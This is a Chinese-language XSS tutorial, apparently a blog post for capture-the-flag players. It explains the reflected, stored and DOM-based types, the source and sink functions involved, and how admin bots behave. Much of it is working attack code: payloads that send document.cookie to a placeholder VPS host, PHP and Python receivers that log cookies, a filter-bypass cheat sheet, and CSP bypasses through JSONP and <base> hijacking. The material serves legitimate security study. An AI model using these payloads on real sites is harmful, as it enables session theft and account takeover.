---
title: XSS
date: 2026-07-15
categories: [web安全, 常见漏洞]
type: tech
---

# XSS 跨站脚本攻击

> XSS（Cross-Site Scripting）的本质是攻击者的 JavaScript 代码在目标网站的源（origin）下被执行。在 CTF 中，它主要用于让**管理员 Bot**访问你的恶意页面，把藏在 Cookie、DOM 或 LocalStorage 中的 flag 带出来。

---

## 一、场景 — XSS 在哪里出现

### 1.1 典型场景

XSS（Cross-Site Scripting，跨站脚本攻击）是指攻击者将恶意脚本注入到目标网站的前端页面中，当其他用户访问该页面时，注入的脚本在受害者浏览器中执行，从而窃取信息或冒充用户操作。

```
场景A：留言板/评论区 → 提交<script> → Bot访问 → Cookie外带
场景B：搜索框回显 → 构造恶意链接 → 诱骗点击 → 窃取Session
场景C：个人资料页 → 存储型XSS → 所有访客均受影响
场景D：URL hash参数 → DOM型XSS → 不经过服务端
场景E：SVG/HTML上传 → 含JS文件被解析 → 在目标源下执行
```

### 1.2 XSS 攻击的危害

注入的脚本在受害者浏览器中以目标网站的"合法身份"运行，可以做到：

| 攻击目标 | 实现方式 | CTF 中的常见形式 |
|---------|---------|----------------|
| 窃取 Cookie | `document.cookie` | 外带 flag（非 HttpOnly） |
| 读取页面 DOM | `document.body.innerHTML` | 页面中渲染的 flag |
| 读取 LocalStorage | `window.localStorage` | 存储的 Token 或 flag |
| 以用户身份操作 | fetch/XHR API | 以受害者身份发请求 |
| 键盘记录 | `addEventListener('keydown')` | 窃取密码 |
| 内网扫描 | 发请求到内网地址 | 探测 SSRF 入口 |

### 1.3 CTF Bot 工作机制

Bot 是一个**无头浏览器**（Headless Chrome），由 Puppeteer/Playwright 驱动，模拟管理员访问你的页面：

```
1. 启动无头浏览器实例
2. 设置含flag的Cookie
3. 访问你的留言/提交的URL
4. 等待 domcontentloaded + 若干秒（让异步请求完成）
5. 关闭浏览器
```

**Bot 时序分析**：

```
Bot 启动
  │
  ├── Cookie 设置完毕
  ├── 导航到你的页面
  │     ├── HTML 加载完成 → domcontentloaded
  │     ├── 你的 XSS 脚本执行
  │     │     ├── 发送外带请求（竞态开始！）
  │     │     └── 外带请求到达你的 VPS
  │     └── Bot 等待 3~5 秒
  │
  └── Bot 关闭浏览器
        └── 未完成的网络请求被取消
```

外带请求必须在 Bot 关闭前到达你的 VPS，否则请求被取消。

---

## 二、原理 — 三种 XSS 的底层差异

### 2.1 反射型 XSS

恶意脚本在**URL参数**中，服务端拼入响应HTML返回。

```
流程：构造恶意URL → 服务器拼接HTML → 浏览器执行
```

```php
<?php
// 危险：直接拼接GET参数到页面
echo '<pre>Hello ' . $_GET['name'] . '</pre>';
?>
```

触发条件：需要受害者点击特制链接，非持久化。

### 2.2 存储型 XSS

恶意脚本被**持久化存储在服务端**（数据库/文件），任何访问页面的用户都会中招。

```
流程：提交恶意内容 → 存入数据库 → 访客读取时执行
```

```php
<?php
// 写入时未过滤
$comment = $_POST['comment'];
$query = "INSERT INTO comments (content) VALUES ('$comment')";

// 读取时未转义
echo "<div>" . $row['content'] . "</div>";
?>
```

CTF最常见：配合 Bot 审核机制，留言后 Bot 自动访问执行。

### 2.3 DOM 型 XSS（详解）

漏洞完全发生在**浏览器端**，服务端不参与 payload 拼接。

```
流程：URL中携带恶意数据 → 前端JS读取 → 写入危险Sink → 执行
```

#### Source（数据入口）

| Source | 读取方式 | 说明 |
|:------:|---------|------|
| `location.href` | `document.URL` | 完整 URL，含参数 |
| `location.hash` | `location.hash` | `#` 后的部分，不发送到服务端 |
| `location.search` | `location.search` | `?` 后的查询字符串 |
| `document.referrer` | `document.referrer` | 来源页面的 URL |
| `window.name` | `window.name` | 窗口/标签页名称，跨页面保留 |
| `postMessage` 数据 | `message.data` | 跨窗口通信 |
| `document.cookie` | 读写 Cookie | 只有 XSS 后才能读取 |
| `history.pushState` | `location` | 修改浏览器历史状态 |
| `localStorage` | `getItem()` | 持久化本地存储 |
| `sessionStorage` | `getItem()` | 会话级本地存储 |

#### Sink（危险写入）

| Sink | 是否创建新标签 | 示例 |
|:----:|:-------------:|------|
| `document.write()` |  | `document.write('<script>alert(1)</script>')` |
| `innerHTML` |  但不执行 `<script>` | `el.innerHTML = '<img src=x onerror=alert(1)>'` |
| `outerHTML` |  | `el.outerHTML = '<div onclick=alert(1)>click</div>'` |
| `eval()` | （执行 JS 代码） | `eval('alert(1)')` |
| `setTimeout()` string |  | `setTimeout('alert(1)', 0)` |
| `setInterval()` string |  | `setInterval('alert(1)', 100)` |
| `Function()` 构造函数 |  | `new Function('alert(1)')()` |
| `insertAdjacentHTML()` |  | `el.insertAdjacentHTML('beforeend', '<img onerror=alert(1) src=x>')` |
| `location.href` | （URL 跳转） | `location.href = 'javascript:alert(1)'` |
| `document.domain` |  | 修改同源策略 |

#### 从 Source 到 Sink 的完整攻击链

```
攻击者构造 URL:
http://target/page.html#<img src=x onerror=alert(1)>
                  │
                  ▼
服务端原样返回 HTML（不拼接 payload）
                  │
                  ▼
浏览器加载页面，执行 JS:
  var hash = location.hash.slice(1);  // Source: 读取hash
  document.getElementById('output').innerHTML = hash; // Sink: 写入DOM
                  │
                  ▼
<img src=x onerror=alert(1)>  被插入页面
                  │
                  ▼
图片加载失败 → onerror 触发 → JS 执行
```

### 2.4 三种 XSS 对比总结

| 对比维度 | 反射型 | 存储型 | DOM型 |
|---------|-------|-------|-------|
| 脚本存储 | URL参数中 | 服务端数据库 | URL/DOM中 |
| 持久化 | 否 | 是 | 否 |
| 触发条件 | 点击恶意链接 | 访问页面即触发 | 点击链接 |
| 服务端参与 | 是（拼接HTML） | 是（存储+输出） | 否（Sink在客户端） |
| CTF常见度 | 一般 | 最常见（配合Bot） | 较少 |
| 绕过 CDN 缓存 | 需独立 URL | 对所有用户生效 | 仅影响特定浏览器 |
| 检测难度 | 低 | 中 | 高（服务端日志无 payload） |
| 修复方式 | 输出编码 | 输出编码+输入过滤 | 避免危险 Sink |

---

## 三、实战 — 验证、外带与绕过

### 3.1 验证 XSS 是否存在

最简验证 payload：
```html
<script>alert(1)</script>
```

如果 `<script>` 被过滤，换用事件属性：
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

**验证原则：先确认弹窗，再构造利用。**不要一上来就写完整外带 payload。

### 3.2 数据外带三种方式

#### 方式一：Image 外带（最简GET）

```html
<script>new Image().src='http://你的VPS/?flag='+encodeURIComponent(document.cookie)</script>
```

原理：给 `Image.src` 赋值即触发 GET 请求，不需要读取响应。跨域友好。

#### 方式二：fetch 外带（异步不跳转）

```html
<script>fetch('http://你的VPS/?flag='+encodeURIComponent(document.cookie))</script>
```

优点：不跳转页面。缺点：Bot 关闭浏览器时未完成的 fetch 可能被取消。

#### 方式三：location 跳转（导航式外带）

```html
<script>location='http://你的VPS/?flag='+document.cookie</script>
```

导航请求本身携带数据，通常不会被自身取消，但会中断后续脚本。

#### 三种方式对比

| 方式 | 可靠性 | 是否跳转 | 是否异步 | 跨域 | 读取响应 |
|:----:|:-----:|:--------:|:--------:|:----:|:--------:|
| `new Image().src` | 较高 | 否 | 否（触发即发） | 是 |  |
| `fetch()` | 一般 | 否 | 是 | 是（简单请求） | 可通过 CORS |
| `location.href=` | 较高 | 是 | 否 | 是 |  |

### 3.3 Cookie 窃取完整流程

#### 【场景】留言板 Bot 型 XSS

目标：Bot 访问留言后，把 `document.cookie` 中的 flag 发送到你的 VPS。

#### 【实战四步流程】

**第一步：VPS 搭建接收端**

```bash
# PHP接收脚本
cat > /var/www/html/xss.php << 'EOF'
<?php
header('Access-Control-Allow-Origin: *');
$cookie = $_GET['cookie'] ?? 'No cookie';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
$log = "Time: $time\nIP: $ip\nCookie: $cookie\n\n";
file_put_contents("cookie.txt", $log, FILE_APPEND);
?>
EOF
```

```bash
# Python 简易接收端
cat > server.py << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        cookie = params.get('cookie', [''])[0]
        with open('cookies.txt', 'a') as f:
            f.write(f"{cookie}\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
EOF
```

**第二步：提交 XSS Payload**

```html
<script>new Image().src='http://你的VPS:8080/?cookie='+encodeURIComponent(document.cookie)</script>
```

**第三步：等待 Bot 访问**

大多数 CTF 平台有"提交 URL 给 Bot"的入口。将留言页面的 URL 提交给 Bot。

**第四步：查看接收的 flag**

```bash
cat /var/www/html/cookie.txt
# 或查看 Python 服务器的 stdout
```

#### 当 flag 不在 Cookie 中时的备用方案

| 数据位置 | 外带脚本 | 适用条件 |
|---------|---------|---------|
| `document.cookie` | `encodeURIComponent(document.cookie)` | 非 HttpOnly Cookie |
| `localStorage` | `JSON.stringify(localStorage)` | 存储在 localStorage |
| `sessionStorage` | `JSON.stringify(sessionStorage)` | 存储在 sessionStorage |
| 页面 DOM | `document.body.innerHTML` | flag 渲染在页面中 |
| 接口响应 | `fetch('/api/flag').then(r=>r.text()).then(d=>new Image().src='http://VPS/?d='+d)` | 需以 Bot 身份发请求 |

### 3.4 Bot 竞态条件深入分析

#### 【场景】外带请求总是收不到，即使确认 XSS 存在

#### 【原因】Bot 生命周期与网络延迟的竞态

```
时间线：
T+0ms   Bot 开始访问页面
T+50ms  HTML 加载完成，XSS 脚本开始执行
T+51ms  脚本发出 fetch() 请求（异步、不阻塞）
T+52ms  脚本继续执行完毕（没有更多代码）
T+3000ms Bot 等待结束（假设等待 3 秒）
T+3001ms Bot 关闭浏览器
          └── 此时未完成的 fetch() 请求被取消
          └── 你的 VPS 没有收到请求
```

#### 【竞态成功的条件】

```
外带请求发送时间 + 网络延迟 ≤ Bot 等待时间
```

#### 【改善方案】

| 方案 | 原理 | 效果 |
|:----:|:----:|:----:|
| 使用 Image 外带 | 触发即发，浏览器不等待响应 | 最佳 |
| 减少 payload 大小 | 减轻解析和网络负担 | 中等 |
| 使用同步 XHR | `xhr.open('GET', url, false)` 同步阻塞 | 可能被浏览器废弃 |
| 加长等待时间 | `setTimeout(fetch, 3000)` | 不一定有用，Bot 可能已关闭 |
| 使用 `navigator.sendBeacon()` | 页面关闭时仍尝试发送 | Web 标准推荐 |

**`sendBeacon` 方案**：

```html
<script>
// sendBeacon 在页面/浏览器关闭时仍会尝试发送
navigator.sendBeacon(
    'http://你的VPS/?cookie=' + encodeURIComponent(document.cookie)
);
</script>
```

### 3.5 Payload 绕过速查（按难度递进）

#### Level 1: 标签名过滤

后端过滤了 `script` `img` `body` 等标签，换用其他标签事件：

```html
<svg onload=alert(1)>
<iframe onload=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

#### Level 2: 空格过滤

HTML 标签名和属性间需要空格？用 `/` 代替：

```html
<svg/onload=alert(1)>
```

JS 内部空格：`new Image()` → `new(window.Image)()`

#### Level 3: 大小写混淆

HTML 标签和属性不区分大小写：

```html
<ScRiPt>alert(1)</ScRiPt>
<SvG/OnLoAd=fetch('http://VPS/')>
```

#### Level 4: 双写绕过

单次替换过滤，嵌套使删除后恢复：

```html
<scrscriptipt>alert(1)</scrscriptipt>
<!-- 删除"script" → 剩下 <script>alert(1)</script> -->
```

#### Level 5: 反引号替代引号

引号被过滤时用模板字符串：

```html
<svg/onload=fetch(`http://VPS/?cookie=${document.cookie}`)>
```

支持 `${}` 表达式嵌入，省去 `+` 拼接。

#### Level 6: eval + 反引号

需要执行复杂代码时：

```html
<svg/onload=eval(`fetch('http://VPS/?flag='+document.cookie)`)>
```

#### Level 7: 编码绕过（属性值内有效）

仅在事件属性值内部，实体编码被解码后进入 JS：

```html
<img src=x onerror="fetch(&#x27;http://VPS/?c=&#x27;+document.cookie)">
```

**注意：** 实体编码不能用于创建新标签。`&lt;script&gt;` 在服务端拼入 HTML 后只是普通文本，不会创建 `<script>` 元素。

#### 绕过技巧完整对照表

| 难度 | 过滤类型 | payload 示例 | 绕过原理 |
|:----:|:--------:|:-----------:|:--------:|
| L1 | 标签名黑名单 | `<svg onload=alert(1)>` | 使用其他标签事件属性 |
| L2 | 空格过滤 | `<svg/onload=alert(1)>` | `/` 代替空格 |
| L3 | 大小写匹配 | `<SvG/OnLoAd=...>` | HTML 不区分大小写 |
| L4 | 单次替换 | `<scrscriptipt>` | 删除中间后首尾拼接 |
| L5 | 引号过滤 | 反引号模板字符串 | JS 模板字符串 |
| L6 | 复杂代码 | `eval(\`...\`)` | 字符串执行 |
| L7 | 关键词检测 | 实体编码 | HTML 属性值内解码 |
| L8 | 贪婪匹配 | `<svg><svg/onload=alert(1)>` | 拆分关键词 |
| L9 | 协议过滤 | `//VPS/` | 协议相对 URL |
| L10 | 括号过滤 | `onerror=alert` 无括号 | 需要特定上下文 |

### 3.6 CSP 绕过要点

当页面存在 Content-Security-Policy 时，需有针对地选择外带方式：

#### CSP 指令与绕过思路

| CSP 指令 | 绕过思路 | 示例 |
|---------|---------|------|
| `script-src 'self'` | 找同源 JSONP 接口 | `<script src="/api/jsonp?callback=alert(1)">` |
| `script-src 'unsafe-inline'` | 允许内联脚本 | 正常注入 |
| `script-src 'nonce-xxx'` | 不能猜测 nonce | 很难绕过 |
| `img-src *` | Image 外带不受限 | `new Image().src='http://VPS/'` |
| `connect-src *` | fetch/XHR 外带不受限 | `fetch('http://VPS/')` |
| `default-src 'none'` | 一切受限，需找漏报 | 找 `<base>` 标签注入 |
| `img-src 'self'` | Image 外带受限 | 找同源图片上传+SSRF |
| `script-src 'self' 'unsafe-eval'` | 允许 eval | `eval(String.fromCharCode(...))` |

#### JSONP 绕过 'self'

当 CSP 设置为 `script-src 'self'` 时，同源的 JSONP 接口可以作为脚本源：

```html
<!-- 如果目标网站有 /api/jsonp?callback=xxx -->
<script src="/api/jsonp?callback=alert(1)"></script>
<!-- 如果 callback 参数可被注入 JS 代码 -->
```

#### `<base>` 标签劫持

当 CSP 限制脚本来源但允许 `<base>` 标签时，可改变相对路径的解析：

```html
<base href="http://攻击者VPS/">
<script src="/app.js"></script>  <!-- 实际加载 http://攻击者VPS/app.js -->
```

若无 CSP 头或策略宽松，直接用标准外带；有严格 CSP 时优先用 `<img>` 外带。

### 3.7 常见 XSS 触发点汇总

| 位置 | XSS类型 | 说明 |
|:----:|:-------:|------|
| 留言板/评论区 | 存储型 | 最常见，配合Bot |
| 搜索框/报错提示 | 反射型 | 参数回显到页面 |
| URL #hash | DOM型 | 前端JS读取hash写入DOM |
| SVG/HTML上传 | 存储型/反射型 | 文件含JS代码 |
| window.name | DOM型 | 跨页面保留数据 |
| postMessage | DOM型 | 跨窗口通信 |
| URL 参数回显 | 反射型 | 搜索、分页、排序参数 |
| User-Agent/Referer | 反射型 | 服务端记录并展示请求头 |
| Cookie | DOM型 | Cookie 值被 JS 读取并写入页面 |
| 路由参数 (HashRouter) | DOM型 | SPA 路由参数不发送到服务端 |

---

## 四、避坑 — 新手常见误区

### 4.1 encodeURIComponent 不能省

```javascript
// 危险：Cookie可能含 # & + 等破坏URL结构的字符
new Image().src='http://VPS/?cookie='+document.cookie

// 安全：URL编码保护结构
new Image().src='http://VPS/?cookie='+encodeURIComponent(document.cookie)
```

### 4.2 Cookie 不一定有 flag

Flag 可能在：`document.cookie`、LocalStorage、页面DOM、接口响应。CTF 中需多种方式尝试。

### 4.3 HttpOnly Cookie 无法读取

`document.cookie` 看不到 `HttpOnly` 标记的 Cookie。此时需：
- 读取页面DOM中的flag
- 以受害者身份发请求获取数据
- 读取 LocalStorage / SessionStorage

### 4.4 Bot 超时收不到请求

外带请求是竞态：Bot 等待时间有限（通常3-5秒）。收不到时检查：
- VPS 网络是否可达
- 端口是否放行
- Bot 是否有足够等待时间
- 优先用 Image 外带（触发即发，不依赖响应）

### 4.5 innerHTML 不会执行 <script>

通过 `innerHTML` 插入的 `<script>` 标签不会执行！但带事件属性的元素（如 `<img onerror=...>` ）会触发。

### 4.6 实体内编码不能"穿墙"

```
服务端拼接：&lt;script&gt;alert(1)&lt;/script&gt;
浏览器看到：显示 "<script>alert(1)</script>" 文本，不会执行
```

实体编码后的字符不会重新进入 HTML 分词器。只在**已有属性值内部**才可能生效。

### 4.7 完整新手避坑清单

| 编号 | 坑 | 正确做法 |
|:----:|:---:|---------|
| 1 | 没用 `encodeURIComponent` 编码 Cookie | Cookie 中 `#` `&` 会破坏 URL |
| 2 | 只尝试 `document.cookie` | flag 可能在 DOM/LocalStorage/API |
| 3 | 忽略 HttpOnly Cookie | 无法用 JS 读取，需其他方法 |
| 4 | Bot 超时收不到请求 | 优先用 Image 外带 |
| 5 | `innerHTML` 插 `<script>` 不执行 | 用事件属性代替 |
| 6 | 实体编码穿墙 | 服务端拼接时无效，仅属性值内有效 |
| 7 | CSP 太严不尝试绕过 | JSONP、`<base>`、同源文件都是突破口 |
| 8 | 没测试是否真的能弹窗就直接上外带 | 先 `alert(1)` 确认 XSS 存在 |
| 9 | 只写了一种外带方式 | 多种方式同时尝试提高成功率 |
| 10 | 忘检查 VPS 防火墙 | 安全组必须放行对应端口 |

---

## 五、知识总结表

### 数据外带三种方式对比

| 方式 | 写法 | 优点 | 缺点 |
|:----:|:----:|:----:|:----:|
| Image | `new Image().src='...'` | 简单、跨域、触发即发 | 无法读响应 |
| fetch | `fetch('...')` | 异步、不跳转 | Bot关闭时可能取消 |
| location | `location='...'` | 导航=外带 | 中断后续脚本 |
| sendBeacon | `navigator.sendBeacon(url, data)` | 页面关闭时仍发送 | POST 方式 |

### Payload 绕过速查

| 难度 | 绕过类型 | 核心技巧 |
|:----:|:--------:|---------|
| L1 | 标签过滤 | `svg` `iframe` `details` `marquee` 事件属性 |
| L2 | 空格过滤 | `/` 代替空格；`new(window.Image)()` |
| L3 | 大小写 | `<SvG/OnLoAd=...>` |
| L4 | 双写 | `<scrscriptipt>` |
| L5 | 引号过滤 | 反引号模板字符串 |
| L6 | 复杂代码 | `eval(\`...\`)` |
| L7 | 编码绕过 | 仅属性值内部有效 |
| L8 | 协议过滤 | `//VPS/` 协议相对 URL |
| L9 | 括号过滤 | 需特定上下文触发 |
| L10 | 关键词分割 | `<svg><svg/onload=alert(1)>` |

### Bot 外带可靠性要点

| 因素 | 说明 |
|:----:|------|
| 网络通畅 | VPS与题目网络可达 |
| 端口放行 | 安全组/防火墙放行监听端口 |
| 等待时间 | Bot默认3-5秒，长内容可能需要更多时间 |
| 外带方式 | Image > sendBeacon > location > fetch（按可靠性） |
| 竞态条件 | 页面可能在请求完成前关闭 |

### CSP 绕过方式速查

| CSP 限制 | 绕过方法 | 成功率 |
|:--------:|---------|:------:|
| `script-src 'self'` | JSONP 接口注入 | 中 |
| `script-src 'unsafe-inline'` | 正常注入 | 高 |
| `script-src 'nonce-xxx'` | 无法猜测 nonce | 低 |
| `img-src *` | Image 外带 | 高 |
| `connect-src *` | fetch/XHR 外带 | 高 |
| `default-src 'none'` | 很难 | 低 |
| `script-src 'self' 'unsafe-eval'` | eval 执行 | 中 |

### Source vs Sink 速查

| Source | 典型用途 | 是否可控 |
|:------:|---------|:--------:|
| `location.hash` | #后片段 |  直接控制 |
| `location.search` | ?后参数 |  直接控制 |
| `location.href` | 完整 URL |  间接控制 |
| `document.referrer` | 来源页面 |  间接控制 |
| `window.name` | 窗口名 |  跨页面控制 |
| `postMessage` | 跨窗口消息 |  跨窗口控制 |
| `document.cookie` | Cookie |  仅读取 |

| Sink | 是否执行 `<script>` | 是否执行事件属性 |
|:----:|:------------------:|:----------------:|
| `document.write()` |  |  |
| `innerHTML` |  |  |
| `outerHTML` |  |  |
| `insertAdjacentHTML()` |  |  |
| `eval()` | （JS 代码） | N/A |
| `setTimeout()` 字符串 | （JS 代码） | N/A |
| `Function()` | （JS 代码） | N/A |
